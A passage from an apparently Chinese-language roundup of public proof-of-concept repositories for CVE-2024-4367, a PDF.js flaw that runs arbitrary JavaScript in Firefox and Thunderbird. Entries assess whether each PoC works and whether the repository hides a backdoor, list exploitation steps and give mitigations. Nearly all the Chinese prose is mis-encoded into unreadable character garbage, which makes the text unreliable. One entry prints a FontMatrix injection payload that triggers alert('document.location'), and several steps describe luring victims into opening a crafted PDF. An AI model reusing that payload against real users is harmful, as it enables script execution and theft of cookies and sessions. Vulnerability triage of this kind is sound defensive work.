1.  **ä¾èµ–é¡¹æŠ•æ¯’:** è„šæœ¬æœ¬èº«å¾ˆç®€å•ï¼Œä¸ä¾èµ–äºå¤–éƒ¨åº“ã€‚å› æ­¤ï¼Œä¾èµ–é¡¹æŠ•æ¯’çš„é£é™©å¾ˆä½ã€‚
2.  **ä»£ç é€»è¾‘æ··æ·†:**  ä»£ç ç›¸å¯¹æ¸…æ™°ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„é€»è¾‘æˆ–æ··æ·†ã€‚
3.  **ä¾›åº”é“¾æ”»å‡»:** ç”±äºè¯¥ PoC æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è„šæœ¬ï¼Œå¹¶æ²¡æœ‰å¤æ‚çš„æ„å»ºæˆ–åˆ†å‘è¿‡ç¨‹ï¼Œä¾›åº”é“¾æ”»å‡»çš„é£é™©ä¹Ÿè¾ƒä½ã€‚

ç„¶è€Œï¼Œåœ¨ä½¿ç”¨ä»»ä½•ç¬¬ä¸‰æ–¹æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ—¶ï¼Œéƒ½åº”ä¿æŒè°¨æ…ï¼Œä»”ç»†å®¡æŸ¥ä»£ç ï¼Œå¹¶åœ¨éš”ç¦»ç¯å¢ƒä¸­æµ‹è¯•ï¼Œä»¥é¿å…æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´ç‚¹ï¼š** PDF.js åœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ã€‚
2.  **æ”»å‡»å‘é‡ï¼š** æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨å­—ä½“å¤„ç†ä¸­çš„æ¼æ´åµŒå…¥æ¶æ„ JavaScript ä»£ç ã€‚
3.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”Ÿæˆæ¶æ„çš„ `poc.pdf` æ–‡ä»¶ï¼ŒæŒ‡å®šè¦æ‰§è¡Œçš„ JavaScript ä»£ç ä½œä¸ºå‚æ•°ã€‚
    *   è¯±å¯¼å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ `poc.pdf` æ–‡ä»¶ã€‚
    *   å¦‚æœ PDF.js é…ç½®å…è®¸æ‰§è¡Œ JavaScript ä»£ç ï¼ˆé»˜è®¤æƒ…å†µä¸‹ `isEvalSupported` ä¸º trueï¼‰ï¼Œåˆ™åµŒå…¥åœ¨ PDF ä¸­çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´:
    *   åœ¨æµè§ˆå™¨ä¸Šä¸‹æ–‡ä¸­çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼Œcookiesï¼Œä¼šè¯ä»¤ç‰Œï¼‰ã€‚
    *   è¿›è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚
    *   å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œå¯èƒ½æ‰§è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [LOURC0D3/CVE-2024-4367-PoC](https://github.com/LOURC0D3/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #6

**æ¥æº**: [CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md](../2024/CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md)

## CVE-2024-4367: PDF.js ä»»æ„JavaScriptæ‰§è¡Œæ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´XSSæ”»å‡»ï¼Œçªƒå–ç”¨æˆ·æ•°æ®ï¼Œç”šè‡³è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„JavaScriptä»£ç ä¼šè¢«æ‰§è¡Œã€‚  

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**  æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶æä¾›äº†æ¼æ´çš„æ¦‚è¿°ã€åˆ©ç”¨æ–¹æ³•ã€ç¼“è§£æªæ–½å’Œè¯¦ç»†åˆ†æçš„é“¾æ¥ã€‚`poc.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„payloadçš„PDFæ–‡ä»¶ã€‚`app` ç›®å½•åŒ…å«ä¸€ä¸ªç®€å•çš„Node.jsåº”ç”¨ï¼Œç”¨äºæœ¬åœ°æµ‹è¯•ï¼Œå…è®¸ä¸Šä¼ PDFæ–‡ä»¶å¹¶é€šè¿‡`pdfjs-dist`åº“è¿›è¡Œæ¸²æŸ“ã€‚  `public/index.html` åŒ…å«å‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ PDFå¹¶ä½¿ç”¨`pdf.js`è¿›è¡Œæ¸²æŸ“ã€‚  

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**  
*   æŸ¥çœ‹ `poc.pdf` ç¡®è®¤æ˜¯å¦æ¤å…¥åé—¨ï¼Œ`poc.pdf` æ˜¯æ¶æ„çš„PDFï¼Œ åˆ©ç”¨äº†å­—ä½“çš„è§£ææ¼æ´ï¼Œæ‰§è¡ŒJavascriptä»£ç ã€‚ ä½†æ˜¯ä¸å±äºåé—¨ï¼Œåªå±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
*   æŸ¥çœ‹ `server.js` ä¸­é—´ä»¶æ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼Œ`server.js` ä¸­é—´ä»¶å±äºæ­£å¸¸çš„expressä¸Šä¼ pdfå’Œæ‰“å¼€pdfçš„é€»è¾‘ã€‚
*   æŸ¥çœ‹ `public/index.html` ç¡®è®¤æ˜¯å¦è°ƒç”¨æ¶æ„apiï¼Œ `public/index.html`å±äºå‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ pdfï¼Œå¹¶æ¸²æŸ“pdfï¼Œæ²¡æœ‰æ¶æ„apiè°ƒç”¨ã€‚
*   æŸ¥çœ‹ `poc.py` ç¡®è®¤æ˜¯å¦ç”Ÿæˆäº†æ¶æ„PDFï¼Œ`poc.py`å±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
æ€»ä½“åˆ¤æ–­æŠ•æ¯’é£é™©æä½ï¼Œå¯èƒ½å­˜åœ¨çš„é£é™©æ˜¯ä¾èµ–åŒ…çš„ä¾›åº”é“¾æŠ•æ¯’é£é™©,è€ƒè™‘åˆ°node_modulesä½“ç§¯å·¨å¤§ï¼Œäººå·¥å®¡è®¡æˆæœ¬å¤ªé«˜ï¼Œæ‰€ä»¥è®¤ä¸ºå­˜åœ¨ 1% çš„æ½œåœ¨æŠ•æ¯’é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨ `poc.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…é€šè¿‡å„ç§æ‰‹æ®µï¼ˆä¾‹å¦‚ï¼Œç”µå­é‚®ä»¶ã€ç½‘ç«™é“¾æ¥ï¼‰è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ–‡ä»¶ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„JavaScriptä»£ç ä¼šåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œä»è€Œå®ç°XSSæ”»å‡»æˆ–æ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç çªƒå–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ã€ä¿®æ”¹ç½‘é¡µå†…å®¹ï¼Œç”šè‡³æ§åˆ¶ç”¨æˆ·çš„è®¡ç®—æœºã€‚

**é¡¹ç›®åœ°å€:** [Masamuneee/CVE-2024-4367-Analysis](https://github.com/Masamuneee/CVE-2024-4367-Analysis)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #7

**æ¥æº**: [CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md](../2024/CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md)

## CVE-2024-4367 - Firefox/Thunderbird PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶ï¼Œå¹¶ä¸”PDF.jsé…ç½®ä¸­`isEvalSupported`è®¾ç½®ä¸º`true` (é»˜è®¤å€¼)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¯¥æ¼æ´æ˜¯ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ POC ä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ªè‡ªå®šä¹‰å­—ä½“ï¼ˆå¯¹è±¡ 5 0 objï¼‰ï¼Œè¯¥å­—ä½“çš„ `FontMatrix` å±æ€§åŒ…å« JavaScript ä»£ç ï¼š`/FontMatrix [0.1 0 0 0.1 0 (1\); alert\('document.location'\)]`ã€‚å½“å‘ˆç°æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå¦‚æœ PDF.js æ²¡æœ‰æ­£ç¡®æ‰§è¡Œç±»å‹æ£€æŸ¥ï¼Œå°±ä¼šæ‰§è¡Œ `alert('document.location')`ã€‚

**æŠ•æ¯’é£é™©ï¼š**

ç»è¿‡åˆ†æï¼Œæä¾›çš„POCä»£ç ä¸­**æ²¡æœ‰**å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`alert('document.location')` ä»…ä»…æ˜¯ä¸€ä¸ªå¼¹çª—ï¼Œç”¨äºéªŒè¯XSSæ˜¯å¦æ‰§è¡Œ. 

æŠ•æ¯’é£é™©è¯„ä¼°ï¼š0%

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **åˆ›å»ºæ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…ä¼šåˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒJavaScript ä»£ç åµŒå…¥åœ¨å­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­ã€‚
2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±å¯¼ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefoxã€Firefox ESR æˆ– Thunderbird æ‰“å¼€è¿™ä¸ªæ¶æ„ PDF æ–‡ä»¶ã€‚è¿™å¯ä»¥é€šè¿‡ç½‘ç»œé’“é±¼æ”»å‡»ã€æ¶æ„ç½‘ç«™æˆ–å°† PDF æ–‡ä»¶åµŒå…¥åˆ°ç”µå­é‚®ä»¶ä¸­æ¥å®ç°ã€‚
3.  **JavaScript ä»£ç æ‰§è¡Œï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šå°è¯•è§£æå’Œå‘ˆç° PDF å†…å®¹ã€‚ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­çš„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚å¦‚æœæˆåŠŸ `alert('document.location')` ä¼šè§¦å‘ã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å¯¼è‡´ä»¥ä¸‹åæœï¼š
    *   **è·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼š** æ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œçªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ Cookieã€ä¼šè¯ä»¤ç‰Œï¼‰ã€ç¯¡æ”¹ç½‘é¡µå†…å®¹æˆ–é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€‚
    *   **ä¿¡æ¯æ³„éœ²ï¼š** æ”»å‡»è€…å¯ä»¥è®¿é—®ç”¨æˆ·çš„æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿæˆ–ç½‘ç»œèµ„æºï¼Œä»è€Œæ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   **å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ï¼š** å°† Firefoxã€Firefox ESR å’Œ Thunderbird å‡çº§åˆ°å·²ä¿®å¤æ­¤æ¼æ´çš„ç‰ˆæœ¬ (>= Firefox 126, >= Firefox ESR 115.11, >= Thunderbird 115.11)ã€‚
*   **è°¨æ…æ‰“å¼€ PDF æ–‡ä»¶ï¼š** é¿å…æ‰“å¼€æ¥è‡ªä¸å¯ä¿¡æ¥æºçš„ PDF æ–‡ä»¶ã€‚
*   **é…ç½® PDF.jsï¼š** å¦‚æœä¸éœ€è¦ JavaScript æ”¯æŒï¼Œå¯ä»¥ç¦ç”¨ PDF.js çš„ JavaScript æ‰§è¡ŒåŠŸèƒ½ (å°† `isEvalSupported` è®¾ç½®ä¸º `false`)ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼ç›¸å¯¹ç®€å•ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ PDF æ–‡ä»¶å¹¶è¯±å¯¼ç”¨æˆ·æ‰“å¼€æ¥æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è™½ç„¶CVSSè¯„åˆ†ä¸é«˜ï¼Œä½†ç”±äºfirefox,thunderbirdç”¨æˆ·çš„å¹¿æ³›æ€§ï¼Œå…¶é€ æˆçš„å±å®³ä¸å¯å¿½è§†

**é¡¹ç›®åœ°å€:** [MihranGIT/POC_CVE-2024-4367](https://github.com/MihranGIT/POC_CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #8

**æ¥æº**: [CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md](../2024/CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md)

## CVE-2024-4367-Firefox-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œä¿¡æ¯æ³„éœ²ã€‚

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefoxã€Firefox ESRå’ŒThunderbirdä¸­PDF.jsç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ã€‚è¯¥æ¼æ´æºäºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œä¸€ä¸ªç‰¹åˆ¶çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚ 

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶ä¸­æä¾›äº†åˆ©ç”¨æ­¥éª¤ï¼š
1.  ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„ `poc.pdf` æ–‡ä»¶ã€‚
2.  ä½¿ç”¨ `firefox.py` è„šæœ¬å¯åŠ¨æ˜“å—æ”»å‡»ç‰ˆæœ¬çš„Firefox (ä¾‹å¦‚ 125ç‰ˆ)ï¼Œå¹¶è‡ªåŠ¨æ‰“å¼€ `poc.pdf`ã€‚
3.  éªŒè¯æ˜¯å¦æ‰§è¡Œäº†JavaScriptä»£ç ï¼Œæ˜¯å¦å¼¹å‡ºäº†alertçª—å£ã€‚

`firefox.py` è„šæœ¬å¯ä»¥ä¸‹è½½å¹¶å¯åŠ¨æŒ‡å®šç‰ˆæœ¬çš„Firefox Nightlyç‰ˆæœ¬ï¼Œè¿™æ–¹ä¾¿äº†æ¼æ´çš„éªŒè¯ã€‚è„šæœ¬è¿˜åŒ…å«äº†ä¸‹è½½ç‰¹å®šç‰ˆæœ¬Firefoxçš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

å¯¹æä¾›çš„POCä»£ç è¿›è¡Œäº†åˆ†æï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚é£é™©ä¸»è¦æ¥è‡ªäºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **`firefox.py`è„šæœ¬:**
    *   è¯¥è„šæœ¬ä¼šä»Mozillaçš„å®˜æ–¹FTPæœåŠ¡å™¨ä¸‹è½½Firefox Nightlyç‰ˆæœ¬ã€‚è™½ç„¶è¿™æ˜¯å®˜æ–¹æ¥æºï¼Œä½†æ”»å‡»è€…å¯èƒ½åœ¨æœªæ¥ç¯¡æ”¹è¿™äº›FTPæœåŠ¡å™¨ï¼ˆè™½ç„¶å¯èƒ½æ€§æä½ï¼‰ã€‚æˆ–è€…ï¼Œåœ¨ä¸‹è½½è¿‡ç¨‹ä¸­å‘ç”Ÿä¸­é—´äººæ”»å‡»ï¼Œä»è€Œä¸‹è½½è¢«ç¯¡æ”¹çš„Firefoxç‰ˆæœ¬ã€‚
    *   è¯¥è„šæœ¬åŒ…å« `subprocess.run` å‡½æ•°ï¼Œç”¨äºæ‰§è¡Œä¸‹è½½çš„Firefoxã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è„šæœ¬æ‰§è¡Œçš„å‚æ•°ï¼Œå¯èƒ½ä¼šæ³¨å…¥é¢å¤–çš„å‚æ•°ï¼Œå¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
    *   å°½ç®¡è„šæœ¬çš„ç›®çš„ä¼¼ä¹æ˜¯ä¸ºäº†æ–¹ä¾¿åœ°ä¸‹è½½å’Œå¯åŠ¨ç‰¹å®šç‰ˆæœ¬çš„Firefoxï¼Œä½†ç”¨æˆ·ä»ç„¶éœ€è¦ä»”ç»†æ£€æŸ¥è„šæœ¬çš„å†…å®¹ï¼Œç¡®ä¿ä¸‹è½½é“¾æ¥å’Œæ‰§è¡Œè¿‡ç¨‹æ˜¯å®‰å…¨çš„ã€‚
2.  **`CVE-2024-4367.py`è„šæœ¬ (æœªæä¾›å…·ä½“ä»£ç ):**
    *   è™½ç„¶`README.md`æŒ‡å‘ä¸€ä¸ªå¤–éƒ¨githubåº“ï¼Œä½†å¦‚æœæ­¤åº“è¢«ç¯¡æ”¹ï¼Œæ‰§è¡Œè„šæœ¬`CVE-2024-4367.py`ç”Ÿæˆçš„`poc.pdf`æ–‡ä»¶æœ‰å¯èƒ½åµŒå…¥æ›´æ¶æ„çš„Payload.
3.  **å…è´£å£°æ˜:**
    *   `README.md` ä¸­åŒ…å«å…è´£å£°æ˜ï¼Œè¿™è¡¨æ˜ä½œè€…æ„è¯†åˆ°æ½œåœ¨çš„é£é™©ï¼Œå¹¶è¯•å›¾æ’‡æ¸…è´£ä»»ã€‚ä½†è¿™å¹¶ä¸èƒ½å®Œå…¨æ¶ˆé™¤é£é™©ï¼Œç”¨æˆ·ä»ç„¶éœ€è¦è‡ªè¡Œæ‰¿æ‹…ä½¿ç”¨POCä»£ç çš„åæœã€‚

æ€»çš„æ¥è¯´ï¼Œè¯¥ä»“åº“çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æ¼”ç¤ºæ¼æ´åˆ©ç”¨ï¼Œè€Œä¸æ˜¯ä¸ºäº†è¿›è¡Œæ¶æ„æ”»å‡»ã€‚ä½†æ˜¯ï¼Œç”¨æˆ·åœ¨ä½¿ç”¨è¿™äº›ä»£ç æ—¶ä»ç„¶éœ€è¦ä¿æŒè­¦æƒ•ï¼Œä»”ç»†å®¡æŸ¥ä»£ç å†…å®¹ï¼Œç¡®ä¿äº†è§£æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´è§¦å‘:** æ”»å‡»è€…éœ€è¦åˆ¶ä½œåŒ…å«ç‰¹å®šæ ¼å¼çš„æ¶æ„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±ã€‚
2.  **JavaScriptæ‰§è¡Œ:** å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šå°è¯•è§£ææ¶æ„å­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´ä»»æ„JavaScriptä»£ç åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  **æ”»å‡»ç›®æ ‡:** æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç æ¥çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ cookiesï¼‰ã€æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€æˆ–è€…è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ã€‚

**æ€»ç»“ï¼š**
è¯¥æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”±äºFirefoxé»˜è®¤ä½¿ç”¨PDF.jsæ‰“å¼€PDFæ–‡ä»¶ï¼Œå› æ­¤è¯¥æ¼æ´å…·æœ‰è¾ƒé«˜çš„å½±å“èŒƒå›´ã€‚æä¾›çš„POCä»£ç å¯ä»¥å¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜éªŒè¯å’Œç†è§£è¯¥æ¼æ´ï¼Œä½†ä¹Ÿéœ€è¦æ³¨æ„æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [PenguinCabinet/CVE-2024-4367-hands-on](https://github.com/PenguinCabinet/CVE-2024-4367-hands-on)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #9

**æ¥æº**: [CVE-2024-4367-Scivous_CVE-2024-4367-npm.md](../2024/CVE-2024-4367-Scivous_CVE-2024-4367-npm.md)

## CVE-2024-4367-PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

